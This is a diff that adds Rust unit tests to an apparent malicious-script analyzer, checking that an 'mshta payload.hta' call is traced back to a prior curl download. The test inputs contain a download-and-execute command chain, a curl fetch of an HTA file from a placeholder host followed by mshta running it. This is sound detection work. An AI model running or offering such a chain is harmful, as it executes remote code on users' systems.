@@ -8650,6 +8650,28 @@ mod misc_handler_tests {
     }
 
     #[test]
+    fn mshta_local_hta_resolves_prior_download_source() {
+        let report = crate::analyze(
+            br#"curl -o payload.hta https://mshta-local.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://mshta-local.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "mshta local HTA did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn rundll32_records_cmd() {
         let mut env = Environment::new(&Config::default());
         interpret_line("rundll32 some.dll,EntryPoint", &mut env);
@@ -14896,6 +14918,29 @@ mod deob_url_scan_tests {
             sweep_count, 0,
             "mshta URL double-emitted as DownloadInDeobText: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn mshta_downloaded_hta_in_deob_text_resolves_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "curl -o payload.hta https://mshta-deob-local.example/payload.hta".to_string(),
+            src: "https://mshta-deob-local.example/payload.hta".to_string(),
+            dst: Some("payload.hta".to_string()),
+        });
+        crate::deob_scan::scan_deob_text("mshta payload.hta", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta payload.hta"
+                            && url == "https://mshta-deob-local.example/payload.hta"
+                )
+            }),
+            "mshta downloaded HTA in deob text was not typed: {:?}",
+            env.traits
         );
     }
 
